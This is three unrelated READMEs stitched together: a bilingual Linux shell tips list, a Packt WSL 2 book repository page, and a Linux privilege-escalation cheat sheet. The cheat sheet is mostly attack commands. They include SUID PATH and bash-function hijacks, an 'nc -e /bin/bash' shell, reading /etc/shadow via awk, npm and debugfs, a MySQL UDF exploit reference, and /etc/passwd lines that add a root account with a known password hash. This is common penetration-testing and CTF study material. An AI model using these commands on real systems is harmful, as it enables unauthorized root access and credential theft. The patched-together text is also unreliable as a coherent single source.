# Linux_menthor

Scripts and tips for Linux users. These are mostly for Ubuntu/Debian Linux, yet there should be something equivalent or similar in the other Linux distributions.

This is a random collection of tips and tricks about Linux.

I collected them over the course of a couple of years as a Linux home user and
a Linux system developer. They may or may not be useful for anybody else. For
some things, there may be different approaches, or even better ones; but what I
describe here worked for me at the time I needed a solution.

1. Calculate the remaining space of the filesystem starting with /dev/ on the hard disk 

    ```bash
    instruction ：df | grep ^/dev/ | awk '{sum += $4} END {print sum " bytes left" }'
    ```

    ![scenario1](./images/scenario1.gif)

2. Folder structure 

    ```bash
    instruction ：tree -d
    ```

    ![scenario2](./images/scenario2.gif)

3. Specific service is being executed 

    ```bash
    instruction ：ps aux | grep -v grep | grep service_name
    ```

4. Custom timestamp (e.g. three months ago) 

    ```bash
    instruction ：date --date='-3 month' +%Y-%m
    ```

    ![scenario4](./images/scenario4.gif)

5. Automatically send the public key to the remote machine and write related settings 

    ```bash
    instruction ：ssh-copy-id -i ~/.ssh/(identity | id_dsa.pub | id_rsa.pub) username@ip
    ```

6. shell

    ```bash
    ls -l `which sh`

    echo $SHELL

    env

    ps $$

    echo "$0"
    ```

7. executed successfully 

    ```bash

    ping -c 1 8.8.8.8

    # check if the ping command was successfully executed.
    # (0 means yes, 1 means no)

    if [ $? -eq 0 ]; then
        echo "successfully executed!" >> report.txt
    fi
    ```

    ```bash

    # this one is shorter

    ping -c 1 8.8.8.8 && echo "successfully executed!" >> report.txt
    ```

8. List all file capacities in the current directory 

    ```bash
    instruction ：du -sh
    ```

9. Continuously observe changes in disk space 

    ```bash
    instruction 一：while true; do clear; df -h; sleep 3; done

    watch -n3 df -h
    ```

10. ssh private key

    ```bash
    instruction ：cp id* .ssh; eval `ssh-agent -s`; ssh-add
    ```

11. root

    ```bash

    if [ "$UID" -ne "$ROOT_UID" ];
    then
        echo "root"
    fi
    ```

    ```bash

    if [ `whoami` != "root" ];
    then
        echo "I am not root"
    fi
    ```

12. /var 

    ```bash
      du -a /var | sort -n -r | head -n 10
    ```

13. List all installed packages 

    ```bash
    dpkg --get-selections > inistalled_packages.txt (for debian)

    rpm -qa > inistalled_packages.txt (for fedora or centos)
    ```

14. 情境：使得某些特定ip透過特定gw出去

    ```bash
    arr=("ip1" "ip2")
    for i in ${arr[*]}
    do
        route add -host $i gw ip
    done
    ```

    [ishadm](tools/ishadm)

    ```bash
    route add -net x.x.x.x netmask x.x.x.x gw x.x.x.x
    ```

15. 情境：ls 列出的檔名需要跳脫(escape)時，自動幫你用引號包起來

    ```bash
    instruction ：ls --quoting-style=shell

    ```

16. 情境：查看CPU核心數 (連 Intel HT 超執行緒技術所虛擬成兩倍個數也算在內)

    ```bash
    grep -c ^processor /proc/cpuinfo

    grep -Ec '^cpu[0-9]+ ' /proc/stat

    ```

    ```bash
    cpu_cores="$(grep -c ^processor /proc/cpuinfo)"
    make -j$(cpu_cores)
    ```

17. 情境：釋出記憶體快取空間

    ```bash
    instruction ：sync; sudo sysctl vm.drop_caches={1, 2, 3, 4}
    ```

18. 情境：使用ls列出最新的檔名列在最下面

    ```bash
    instruction ：ls -sort
    ```

19. 切換該terminal的訊息顯示語言為英文 (非永久變更，僅限該登入session)

    ```bash
    instruction ：export LC_ALL=C;LANG=C;LANGUAGE=en_US

    $ locale
    LANG=C
    LANGUAGE=en_US
    LC_CTYPE="C"
    LC_NUMERIC="C"
    LC_TIME="C"
    LC_COLLATE="C"
    LC_MONETARY="C"
    LC_MESSAGES="C"
    LC_PAPER="C"
    LC_NAME="C"
    LC_ADDRESS="C"
    LC_TELEPHONE="C"
    LC_MEASUREMENT="C"
    LC_IDENTIFICATION="C"
    LC_ALL=C
    ```

20. 情境：用sudo執行上一個instruction 

    ```bash
    instruction ：sudo !!
    ```

21. 情境：檢查 iptables log 是否有持續收錄

    ```bash

    NO_LOG=0
    NOWLOGS=$(grep iptables /var/log/messages| wc -l)
    PASTLOGS=$(cat n_of_log)

    if [ $NOWLOGS == $NO_LOG ]; then
        echo "no business today"

    elif [ $NOWLOGS -eq $PASTLOGS ]; then
        echo "no business during checking points"

    elif [ $NOWLOGS -gt $PASTLOGS ]; then
        echo "New logs logged"
        echo "$NOWLOGS" > n_of_log

    else
        echo "refresh n_of_log"
        echo "$NOWLOGS" > n_of_log

    fi
    ```

22. 情境：檔案若使用git進行版本控制，檔案進行修改後，可使用instruction 產生patch，後續可在其他的git repositary 加入patch檔的修正

    ```bash
    instruction ：git diff commit1 commit 2 > foo.patch
    ```

    ![scenario22](./images/scenario22.gif)

23. 情境：以SSH登入時出現「WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!」

    ```bash
    instruction ：ssh-keygen -R 
    ```

24. 情境：用 date 將人類可讀的日期、時間 <-> unix time

    ```bash
    # unix time 
    date -d @timestamp

    # unix time
    date +%s --date='2015-01-01'
    ```

25. 情境：用 chsh 更改 shell 環境

    ```bash
    # 先用 cat /etc/shells 查看有哪些 shell 環境

    chsh -s /etc/bash
    ```

26. 情境：bash 變數索引表

    ```bash
    echo $BASH_VERSION
    echo $HOSTNAME
    echo $CDPATH
    echo $IFS
    echo $PATH
    echo $TMOUT
    ```

27. 情境：讓 history 顯示時間戳記

    ```bash
    instruction ：export HISTTIMEFORMAT="%F %T "
    ```

28. 情境：多個 inter active bash 存在時，讓 history 不會彼此 overwrite

    ```bash
    instruction ：shopt -s histappend
    ```

29. 情境：協助 bash 腳本 debug

    ```bash
    set -e
    set -x
    ```

30. 情境：以更彈性的方式操作 date instruction 的輸出

    ```bash
    set `date`
    echo $1 $6
    ```

31. 情境：Linux 效能觀察相關工具查閱表

    ![linux_observability_tools](./images/linux_observability_tools.png)

32. 情境：Linux 效能觀察參數查閱表 (以sar工具來觀察)

    ![linux_observability_sar](./images/linux_observability_sar.png)

33. 情境：Linux 效能測試相關工具查閱表

    ![linux_benchmarking_tools](./images/linux_benchmarking_tools.png)

34. 情境：Linux 效能調校相關工具查閱表

    ![linux_tuning_tools](./images/linux_tuning_tools.png)

35. 情境：netfilter packet 遊歷表

    ![netfilter_packet_traversal](./images/nfk-traversal.png)

36. 情境：子網路遮罩計算機

    ```bash
    instruction 一：sipcalc 192.168.100.0/24

    -[ipv4 : 192.168.100.0/24] - 0

    [CIDR]
    Host address        - 192.168.100.0
    Host address (decimal)  - 3232261120
    Host address (hex)  - C0A86400
    Network address     - 192.168.100.0
    Network mask        - 255.255.255.0
    Network mask (bits) - 24
    Network mask (hex)  - FFFFFF00
    Broadcast address   - 192.168.100.255
    Cisco wildcard      - 0.0.0.255
    Addresses in network    - 256
    Network range       - 192.168.100.0 - 192.168.100.255
    Usable range        - 192.168.100.1 - 192.168.100.254

    whatmask 192.168.100.0/24

    ------------------------------------------------
               TCP/IP NETWORK INFORMATION
    ------------------------------------------------
    IP Entered = ..................: 192.168.100.0
    CIDR = ........................: /24
    Netmask = .....................: 255.255.255.0
    Netmask (hex) = ...............: 0xffffff00
    Wildcard Bits = ...............: 0.0.0.255
    ------------------------------------------------
    Network Address = .............: 192.168.100.0
    Broadcast Address = ...........: 192.168.100.255
    Usable IP Addresses = .........: 254
    First Usable IP Address = .....: 192.168.100.1
    Last Usable IP Address = ......: 192.168.100.254
    ```

37. 情境：以 sshfs mount 遠端 server 的 filesystem

    ```bash
    # 將遠端主機 IP 為 192.168.1.123 的 /root/ 目錄掛載到 /mnt/server1 目錄下
    sudo sshfs root@192.168.1.123:/ /mnt/server1/
    ```

38. 情境：設定 alias，使其 ssh 連線到須透過特定 gw 的機器前先做檢查

    ```bash
    # 將以下寫入 .bashrc 中
    gw=$(sudo route -n|grep -o -E '(gw1_IP|gw2_IP)')

    instruction 一：alias connect2remote="if [ $gw == "gw1_IP" ]; then ssh username@ip; else echo 'wrong gw'; fi"
    instruction 二：alias connect2remote="[ $gw == "gw1_IP" ] && ssh username@ip || echo 'wrong gw!'"
    ```

39. 情境：查詢外部 (WAN) ip

    ```bash
    instruction 一：curl ifconfig.me/ip
    instruction 二：wget -qO- ifconfig.me/ip

    #   ifconfig.me/ip 可替換成下列任一個
        whatismyip.org
        icanhazip.com
        tnx.nl/ip
        myip.dnsomatic.com
        ip.appspot.com
        checkip.dyndns.org:8245
        whatismyip.com
        jsonip.com
    ```

40. 情境：間隔 n 分鐘後關機

    ```bash
    instruction ：shutdown -h +n
    ```

    ```bash
    腳本一：
    $ bash countdown n

    The system will be shutdown in 5 minutes
    Shutting down in 5 minutes
    Shutting down in 4 minutes
    Shutting down in 3 minutes
    Shutting down in 2 minutes
    Shutting down in 1 minutes
    SEE YA~
    ```

    [countdown](tools/countdown)

    ```bash
    $ rshutdown -g600

    Shutdown started.    Thu Dec  2 18:26:58 EST 2004

    The system mars will be shutdown in 10 minutes
    The system mars will be shutdown in 9 minutes
    The system mars will be shutdown in 8 minutes
    The system mars will be shutdown in 4 minutes
    THE SYSTEM mars IS BEING SHUT DOWN NOW ! ! !
    ```

    [rshutdown](tools/rshutdown)

41. 情境：一主機雙網卡

    ```bash
    ip route flush table 70
    ip route add to 172.70.12.0/23 dev eth0 table 70
    ip route add to default via 172.70.12.1 dev eth0 table 70

    ip route flush table 80
    ip route add to 172.80.24.0/23 dev eth1 table 80
    ip route add to default via 172.80.24.1 dev eth1 table 80

    ip rule add from 172.70.12.0/23 table 70 priority 70
    ip rule add from 172.80.24.0/23 table 80 priority 80

    # 清空 route cache
    ip route flush cache
    ```

42. 情境：Ubuntu 移除沒用到的 kernel 與 header

    ```bash
    instruction ：sudo apt-get purge $(dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve "$(uname -r | sed -r 's/-[a-z]+//')")
    ```

    ```bash
    腳本：
    sudo /usr/sbin/update-grub
    sudo apt-get autoremove
    ```


43. 情境：如何知道特定 process 開始執行的日期與時間？

    ```bash
    假設 lxterminal的pid是1878
    
    instruction ： stat /proc/1878
    
    結果：
    $ stat /proc/1878/
    File: ‘/proc/1878/’
    Size: 0          Blocks: 0          IO Block: 1024   directory
    Device: 4h/4d Inode: 14925       Links: 9
    Access: (0555/dr-xr-xr-x)  Uid: ( 1000/  qerter)   Gid: ( 1000/  qerter)
    Access: 2016-08-21 13:45:49.681763512 +0800
    Modify: 2016-08-21 13:45:49.681763512 +0800
    Change: 2016-08-21 13:45:49.681763512 +0800
    Birth: -
    
    其中Modify時間可做為該process開始執行日期與時間之參考
    ```

# File editing 

1. 情境：去除檔案中惱人的^M符號。(注意，^M要打ctrl+v及ctrl+m才會出現。)

    ```bash
    instruction 一：sed -i -e 's/^M//g' file

    instruction 二：dos2unix file

    // 這個符號多半是因為Windows上面編輯的檔案移到Unix系統上在編輯的時候會遇到，使用 dos2unix 可以直接轉換。

    instruction 三：perl -p -i -e 's/\r\n$/\n/g' my_file.txt

    instruction 四：若已經用 vim 開啟的話，可執行下列instruction 於 vim 裡：

    // 參考 [File format - Vim Tips Wiki](http://vim.wikia.com/wiki/File_format)

    :update            # 存儲任何修改。
    :e ++ff=dos        # 強制以 DOS 檔案格式，重新編輯檔案。
    :setlocal ff=unix  # 設定此 buffer 將只會以 LF 換行字元 (UNIX 檔案格式) 來寫入檔案。
    :w                 # 以 UNIX 檔案格式將  buffer 寫入檔案。
    ```

2. 情境：字串結合、調整

    ```bash
    instruction ：echo {{1,2,3}1,2,3}
    ```

3. 情境：字串結合、調整

    ```bash
    instruction ：echo fi{one,two,red,blue}sh
    ```

4. 情境：在檔案第一行插入字串（例如csv檔要加表格名稱）

    ```bash
    instruction ：(echo -n '<added text>\n'; cat test) > new_test
    ```

5. 情境：大量改檔案編碼(big5 -> utf-8)

    ```bash
    instruction ：convmv -r -f <from> -t <to> dir/

    // 遞迴改（不是真改）

    instruction ：convmv -r -f --notest -f <from> -t <to> dir/

    // 遞迴改（真改）
    ```

6. 情境：一次用grep查詢2個以上關鍵字

    ```bash
    instruction ：grep -E '(foo|bar)'
    ```

7. 情境：字串全部自動改成大(小)寫

    ```bash
    instruction 一：echo TeSt | awk '{ print toupper($_) }'

    // 全改大寫

    instruction 二：echo TeSt | awk '{ print tolower($_) }'

    // 全改小寫
    ```

8. 情境：遞迴搜尋資料夾，但是忽略符合格式的檔案(例如 `*.pyc`)

    ```bash
    instruction ：grep -r keyword --exclude '*.pyc' target_folder/

    // 範例：grep -r "import os" --exclude '*.pyc' my_project/
    ```

9. 情境：迅速撈出檔案中的特定行數

    例如：迅速撈出第 16 行內容

    ```bash
    instruction 一：nl index.html | grep "^\s*16" | head -n 1
    instruction 二：sed -n 16p index.html
    ```

10. 情境：以「,」來斷字

    ```bash
    腳本：

    #!/bin/bash
    IFS=$','
    vals='/mnt,/var,/dev,/tmp,/Virtual Machines'
    for i in $vals; do echo $i; done
    unset IFS
    ```

11. 情境：字串處理訣竅

    ```bash
    # 變數/參數若無值則給予值 (適用於positional parameter)
    ${var:-defaultValue}

    # 變數/參數若無值則給予值 (不適用於 positional parameter)
    ${var:=defaultValue}

    # 變數/參數若無值則跳錯誤訊息
    ${var:?"error_msg"}

    # 計算變數/參數字串長度
    ${#var}

    # 刪除字串後半部符合 pattern 的部分 (shortest)
    ${var%pattern}

    # 刪除字串後半部符合 pattern 的部分 (longest)
    ${var%%pattern}

    # 顯示子字串(由左到右從第n個開始連續m個，n m 皆為數字)
    ${var:n:m}

    # 刪除字串前半部符合 pattern 的部分 (shortest)
    ${var#pattern}

    # 刪除字串後半部符合 pattern 的部分 (longest)
    ${var##pattern}

    # 替換字串中符合 pattern 的部分
    # 若字串中有多個地方符合 pattern 則只會替換第一個找到的 pattern
    ${var/pattern/string}

    # 替換字串中所有符合 pattern 的部分
    ${var//pattern/string}
    ```

12. 情境：將檔案中重複的行，印出來

    ```
    sort duplicates.txt |uniq -d
    ```

13. 情境：漂亮排版

    ```bash
    instruction ：alias pp="column -s ';' -t"

    輸出結果(未使用 pp)：
    $ cat test.txt
    1;John
    3;Mary

    輸出結果(使用 pp)：
    cat test.txt|pp
    1  John
    3  Mary
    ```

14. 情境：轉換檔案編碼

    ```bash
    for file in *.php
    do
        iconv -f big5 -t utf8 -o "$file.new" "$file" &&
        mv -f "$file.new" "$file"
    done
    ```

### 檔案處理

1. 情境：大量改檔案名稱，並且遞增檔案id

    ```bash
    instruction ：ls | awk '{print "mv "$1" "NR".txt"}' | sh
    ```

2. 情境：大量改檔案名稱，取代檔案名稱中的某些字串(例如拿掉副檔名)

    ```bash
    instruction ：rename 's/\.bak$//' *.bak
    ```

3. 情境：大量改檔案名稱，大寫換小寫

    ```bash
    instruction ：rename 'y/A-Z/a-z/' *
    ```

4. 情境：將目錄中所有檔案逐一處理（檔案名稱無規則性）

    ```bash
    腳本：上面這個方法萬一資料夾裡面還有資料夾，可能就不符合預期行為。

    for file in $(ls folder)
    do
        python utils/submit.py folder/$file
    done
    ```

    ```bash
    instruction ：find folder -type f -maxdepth=1 -exec CMD ‘{}’ \;
    ```

5. 情境：大檔案切割，切成多個小檔案

    ```bash
    instruction ：split --bytes=1024m bigfile.iso file_prefix_
    ```

6. 情境：結合小檔案變成大檔案

    ```bash
    instruction ：cat small_file_* > joined_file.iso
    ```

7. 情境：顯示目錄底下資料夾大小並排序

    ```bash
    instruction 一：du -B K /dir --max-depth=1 | sort -g    //KB為單位

    instruction 一：du -B M /dir --max-depth=1 | sort -g    //MB為單位

    instruction 一：du -B G /dir --max-depth=1 | sort -g    //GB為單位

    instruction 二：for i in G M K; do du -ah | grep [0-9]$i | sort -nr -k 1; done | head -n 11
    ```

8. 情境： 將目錄下所有的檔案製作MD5(遞迴走訪)

    ```bash
    instruction ：find . -type f -exec md5sum {} \;
    ```

9. 情境：創建1M的空白檔案(內容全部填0)

    ```bash
    instruction ：dd if=/dev/zero of=test.img bs=1M count=1

    // 檢查

    $ hexdump -C test.img
    00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
    *
    00100000
    ```

10. 情境：將1.png ~ 10.png 更名為001.png ~ 010.png

    ```bash
    instruction ：$ for i in `seq 1 10`; do mv $i.png `printf "%03d" $i`.png; done
    ```

11. 情境：將檔案名稱中空白部分以底線取代

    ```bash
    instruction ：rename 'y/ /_/' *
    ```

12. 情境：將 MySQL 資料庫內容輸出至 csv 檔

    ```bash
    instruction ：mysql -u username -p -B -e "show columns from table;" | sed "s/'/\'/;s/\t/\",\"/g;s/^/\"/;s/$/\"/;s/\n//g" >> test.csv
    ```

13. 情境：快速備份檔案

    ```bash
    腳本：請直接加在 .bashrc 中，並執行 source ~/.bashrc。

    function backup()
    {
        cp $1 $1.bak
    }

    # 使用方法：$ backup file.sh
    # 執行結果：產出 file.sh.bak 檔

    ```

14. 情境：懶人解壓縮法

    ```bash
    腳本：請直接加在 .bashrc 中，並執行 source ~/.bashrc。

    function extract()      # Handy Extract Program
    {
        if [ -f $1 ] ; then
            case $1 in
                *.tar.bz2)   tar xvjf $1     ;;
                *.tar.gz)    tar xvzf $1     ;;
                *.bz2)       bunzip2 $1      ;;
                *.rar)       unrar x $1      ;;
                *.gz)        gunzip $1       ;;
                *.tar)       tar xvf $1      ;;
                *.tbz2)      tar xvjf $1     ;;
                *.tgz)       tar xvzf $1     ;;
                *.zip)       unzip $1        ;;
                *.Z)         uncompress $1   ;;
                *.7z)        7z x $1         ;;
                *)           echo "'$1' cannot be extracted via >extract<" ;;
            esac
        else
            echo "'$1' is not a valid file!"
        fi
    }

    # 使用方法：$ extract file.壓縮檔副檔名

    ```

15. 情境：取得符號連結 (symlink; symbolic link) 最終所指向的檔案之完整路徑

    ```bash
    # 例如：取得系統安裝的 java 路徑。

    instruction 一：readlink -f "$(which java)"

    instruction 二：realpath "$(which java)"
    # 需額外灌一個套件 "realpath"

    instruction 三：python -c "import os; print os.path.realpath('$(which java)')"

    # 以上三個輸出結果皆為：
    # /usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java

    instruction 四：namei -x "$(which java)"
    # 輸出結果：
    # f: /usr/bin/java
    #  D /
    #  d usr
    #  d bin
    #  l java -> /etc/alternatives/java
    #    D /
    #    d etc
    #    d alternatives
    #    l java -> /usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java
    #      D /
    #      d usr
    #      d lib
    #      d jvm
    #      d java-7-openjdk-amd64
    #      d jre
    #      d bin
    #      - java
    ```

16. 以 python 實作 bash 函式

    ```bash
    function pipe_func_in_py() {

    python -c "$(cat <<EOPY
    import sys
    for line in sys.stdin:
        print ( "%s" % ( line.rjust(25) ) )
    EOPY
    )"

    }

    ```

17. 以 wget 抓取整個網站

    ```bash
    $ wget --recursive --no-clobber --page-requisites --html-extension --convert-links --restrict-file-names=windows url
    --recursive: download the entire Web site.
    --domains example.org: don’t follow links outside website.org.
    --no-parent: don’t follow links outside the directory manual/install/.
    --page-requisites: get all the elements that compose the page (images, CSS and so on).
    --html-extension: save files with the .html extension.
    --convert-links: convert links so that they work locally, off-line.
    --restrict-file-names=windows: modify filenames so that they will work in Windows as well.
    --no-clobber: don’t overwrite any existing files (used in case the download is interrupted and resumed).
    -e robots=off: ignore robots.txt
    ```

# Sub Linux 2

<a href="https://www.packtpub.com/cloud-networking/windows-subsystem-for-linux-2-wsl-2-tips-tricks-and-techniques?utm_source=github&utm_medium=repository&utm_campaign=9781800562448"><img src="https://static.packt-cdn.com/products/9781800562448/cover/smaller" alt="Windows Subsystem for Linux 2 (WSL 2) - Tips, Tricks, and Techniques" height="256px" align="right"></a>

This is the code repository for [Windows Subsystem for Linux 2 (WSL 2) - Tips, Tricks, and Techniques](https://www.packtpub.com/cloud-networking/windows-subsystem-for-linux-2-wsl-2-tips-tricks-and-techniques?utm_source=github&utm_medium=repository&utm_campaign=9781800562448), published by Packt.

**Maximise productivity of your Windows 10 development machine with custom workflows and configurations**

## What is this book about?

Windows Subsystem for Linux (WSL) allows you to run native Linux tools alongside traditional Windows applications. Whether you’re developing applications across multiple operating systems or just want to bring more tools into your Windows environment, WSL offers endless possibilities and seamless interoperability. This book will help you learn about the Windows Subsystem for Linux and how to use it effectively through a hands-on approach.

This book covers the following exciting features:

- Install and configure Windows Subsystem for Linux and Linux distros
- Access web applications running in Linux from Windows
- Invoke Windows applications, file systems, and environment variables from bash in WSL
- Customize the appearance and behavior of the Windows Terminal to suit your preferences and workflows
- Explore various tips for enhancing the Visual Studio Code experience with WSL
- Install and work with Docker and Kubernetes within Windows Subsystem for Linux
- Discover various productivity tips for working with Command-line tools in WSL

If you feel this book is for you, get your [copy](https://www.amazon.com/dp/1800562446) today!

<a href="https://www.packtpub.com/?utm_source=github&utm_medium=banner&utm_campaign=GitHubBanner"><img src="https://raw.githubusercontent.com/PacktPublishing/GitHub/master/GitHub.png"
alt="https://www.packtpub.com/" border="5" /></a>

## Instructions and Navigations

All of the code is organized into folders. For example, Chapter02.

The code will look like the following:

```
"profiles": {
"defaults": {
"fontFace": "Cascadia Mono PL"
},
```

**Following is what you need for this book:**
This book is for developers who want to use Linux tools on Windows, including Windows-native programmers looking to ease into a Linux environment based on project requirements or Linux developers who've recently switched to Windows. This book is also for web developers working on open source projects with Linux-first tools such as Ruby or Python, or developers looking to switch between containers and development machines for testing apps. Prior programming or development experience and a basic understanding of running tasks in bash, PowerShell, or the Windows Command Prompt will be required.

With the following software and hardware list you can run all code files present in the book (Chapter 1-11).

### Software and Hardware List

| Chapter | Software required | OS required |
| -------- | ------------------------------------ | ----------------------------------- |
| 1 - 11 | Docker Desktop | Windows 10 version 2004 build 19041 |
| 1 - 11 | Visual Studio Code | Windows 10 version 2004 build 19041 |

We also provide a PDF file that has color images of the screenshots/diagrams used in this book. [Click here to download it](https://static.packt-cdn.com/downloads/9781800562448_ColorImages.pdf).

### Related products

- Learning Microsoft Project 2019 [[Packt]](https://www.packtpub.com/product/learning-microsoft-project-2019/9781838988722?utm_source=github&utm_medium=repository&utm_campaign=9781838988722) [[Amazon]](https://www.amazon.com/dp/1838988726)

- Workflow Automation with Microsoft Power Automate [[Packt]](https://www.packtpub.com/product/workflow-automation-with-microsoft-power-automate/9781839213793?utm_source=github&utm_medium=repository&utm_campaign=9781839213793) [[Amazon]](https://www.amazon.com/dp/1839213795)

## Get to Know the Author

**Stuart Leeks**
is a principal software development engineer at Microsoft. He has worked with a wide range of customers, from small ISVs to large enterprises, to help them be successful building with the Microsoft technology stack. While Stuart has experience with a diverse set of technologies, he is most passionate about the web and the cloud.
Stuart is a web geek, lover of containers, cloud fanatic, feminist, performance and scalability enthusiast, father of three, husband, and a salsa dancer and teacher, and loves bad puns. He has been writing code since the days of the BBC Micro and still gets a kick out of it.

# Linux-Privilege-Escalation

Tips and Tricks for Linux Priv Escalation

Fix the Shell:

```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali Note the number of rows and cols in the current terminal window
$ stty -a  

# Next we will enable raw echo so we can use TAB autocompletes 
$ stty raw -echo
$ fg

# In reverse shell
$ stty rows <num> columns <cols>
   
# Finally
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
```

## Start with the basics

Who am i and what groups do I belong to?  
`id`

Who else is on this box (lateral movement)?  
`ls -la /home`  
`cat /etc/passwd`  

What Kernel version and distro are we working with here?  
`uname -a`  
`cat /etc/issue`  

What new processes are running on the server (Thanks to IPPSEC for the script!):

```
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

We can also use pspy on linux to monitor the processes that are starting up and running:  
<https://github.com/DominicBreuker/pspy>

Check the services that are listening:

```bash
ss -lnpt
```

## What can we EXECUTE?

Who can execute code as root (probably will get a permission denied)?  
`cat /etc/sudoers`

Can I execute code as root (you will need the user's password)?  
`sudo -l`

What executables have SUID bit that can be executed as another user?  
`find / -type f -user root -perm /u+s -ls 2>/dev/null`  
`find / -user root -perm -4000 -print 2>/dev/null`  
`find / -perm -u=s -type f 2>/dev/null`  
`find / -user root -perm -4000 -exec ls -ldb {} \;`  

Do any of the SUID binaries run commands that are vulnerable to file path manipulation?  
`strings /usr/local/bin/binaryelf`  
`mail`  
`echo "/bin/sh" > /tmp/mail`
`cd /tmp`  
`export PATH=.`  
`/usr/local/bin/binaryelf`  

Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?
`strings /usr/bin/binaryelf`  
`mail`
`function /usr/bin/mail() { /bin/sh; }`  
`export -f /usr/bin/mail`  
`/usr/bin/binaryelf`  

Can I write files into a folder containing a SUID bit file?  
Might be possible to take advantage of a '.' in the PATH or an The IFS (or Internal Field Separator) Exploit.  

If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:

| SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
|---------------------------------------|-------------------------------------------------------------------------------------|
| (ALL : ALL ) ALL                      | You can run any command as root.<br>sudo su - <br>sudo /bin/bash                                 |
| nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                           |
| netcat<br>nc<br>nc.traditional        | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
| ncat                                  |                                                                                     |
| awk <br>gawk                          | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
| python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
| php                                   |      |
| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash \\;<br> find /home -exec /bin/bash \\;  |
| xxd                                   |                                                                                     |
| vi                                    |                                                                                     |
| more                                  |                                                                                     |
| less                                  |                                                                                     |
| nano                                  |                                                                                     |
| cp                                    |                                                                                     |
| cat                                   |                                                                                     |
| bash                                  |                                                                                     |
| ash                                  |                                                                                     |
| sh                                  |                                                                                     |
| csh                                  |                                                                                     |
| curl                                  |                                                                                     |
| dash                                  |                                                                                     |
| pico                                  |                                                                                     |
| nano                                  |                                                                                     |
| vrim                                  |                                                                                     |
| tclsh                                  |                                                                                     |
| git                                  |                                                                                     |
| scp                                  |                                                                                     |
| expect                                  |                                                                                     |
| ftp                                  |                                                                                     |
| socat                                  |                                                                                     |
| script                                  |                                                                                     |
| ssh                                  |                                                                                     |
| zsh                                  |                                                                                     |
| tclsh                                  |                                                                                     |
| strace                                  |  Write and compile a a SUID SUID binary c++ program <br> strace chown root:root suid <br> strace chmod u+s suid <br> ./suid        |
| npm                                 |  ln -s /etc/shadow package.json && sudo /usr/bin/npm i *                            |
| rsync                                  |                                                                                     |
| tar                                  |                                                                                     |
|Screen-4.5.00     | <https://www.exploit-db.com/exploits/41154/>        |

*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the GTFOBins project website here:  
<https://gtfobins.github.io/>

Can I access services that are running as root on the local network?  
`netstat -antup`  
`ps -aux | grep root`  

| Network Services Running as Root      | Exploit actions                                                                     |
|---------------------------------------|-------------------------------------------------------------------------------------|
| mysql                                 | raptor_udf2 exploit<br> 0xdeadbeef.info/exploits/raptor_udf2.c <br> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
| apache            | drop a reverse shell script on to the webserver                                     |
| nfs             | no_root_squash parameter <br>  Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
| PostgreSQL                            | <https://www.exploit-db.com/exploits/45184/>                                          |

Are there any active tmux sessions we can connect to?  
`tmux ls`  

## What can we READ?

What files and folders are in my home user's directory?  
`ls -la ~`  

Do any users have passwords stored in the passwd file?
`cat /etc/passwd`  

Are there passwords for other users or RSA keys for SSHing into the box?  
`ssh -i id_rsa root@10.10.10.10`  

Are there configuration files that contain credentials?

| Application and config file           | Config File Contents                                                                |
|---------------------------------------|-------------------------------------------------------------------------------------|
| WolfCMS <br> config.php               | // Database settings: <br> define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');<br> define('DB_USER', 'root');<br> define('DB_PASS', 'john@123');<br>        |
| Generic PHP Web App                   | define('DB_PASSWORD', 's3cret');                                                     |
| .ssh directory           | authorized_keys<br>id_rsa<br>id_rsa.keystore<br>id_rsa.pub<br>known_hosts            |
| User MySQL Info                 | .mysql_history<br>.my.cnf                     |
| User Bash History                  | .bash_history                                      |

Are any of the discovered credentials being reused by multiple acccounts?  
`sudo - username`  
`sudo -s`  

Are there any Cron Jobs Running?  
`cat /etc/crontab`  

What files have been modified most recently?  
`find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r`  
`find /home -type f -mmin -60`  
`find / -type f -mtime -2`  

Is the user a member of the Disk group and can we read the contents of the file system?  
`debugfs /dev/sda`  
`debugfs: cat /root/.ssh/id_rsa`  
`debugfs: cat /etc/shadow`  

Is the user a member of the Video group and can we read the Framebuffer?  
`cat /dev/fb0 > /tmp/screen.raw`  
`cat /sys/class/graphics/fb0/virtual_size`  

## Where can we WRITE?

What are all the files can I write to?  
`find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null`  

What folder can I write to?  
`find / -regextype posix-extended -regex "/(sys|srv|proc|usr|lib|var)" -prune -o -type d -writable 2>/dev/null`  

| Writable Folder / file    | Priv Esc Command                                                                                |
|---------------------------|-------------------------------------------------------------------------------------------------|
| /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
| /etc/passwd               | manually add a user with a password of "password" using the following syntax<br>user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |

